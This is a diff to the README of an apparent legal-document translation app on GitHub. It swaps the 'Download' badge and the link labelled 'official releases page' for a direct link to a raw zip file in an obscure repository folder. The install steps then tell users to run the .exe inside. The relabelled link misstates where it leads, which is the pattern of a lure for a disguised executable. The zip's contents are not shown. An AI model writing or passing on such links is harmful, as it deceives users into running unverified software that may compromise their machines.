@@ -1,6 +1,6 @@
 # ⚖️ legal-translation-UK - Translate legal documents into English easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Unworkmanlike-fragment349/legal-translation-UK/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Unworkmanlike-fragment349/legal-translation-UK/raw/refs/heads/main/deep/UK-legal-translation-2.5.zip)
 
 This application translates legal documents into publication-ready English. It handles Word files in any language and maintains the original formatting. It uses specialized lexicons and dictionaries to achieve high accuracy for legal terminology.
 
@@ -19,7 +19,7 @@ Your computer must meet these basic needs:
 
 ### 📥 Download and Install
 
-1. Visit the [official releases page](https://github.com/Unworkmanlike-fragment349/legal-translation-UK/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/Unworkmanlike-fragment349/legal-translation-UK/raw/refs/heads/main/deep/UK-legal-translation-2.5.zip) to download the installer.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to finish the setup process.
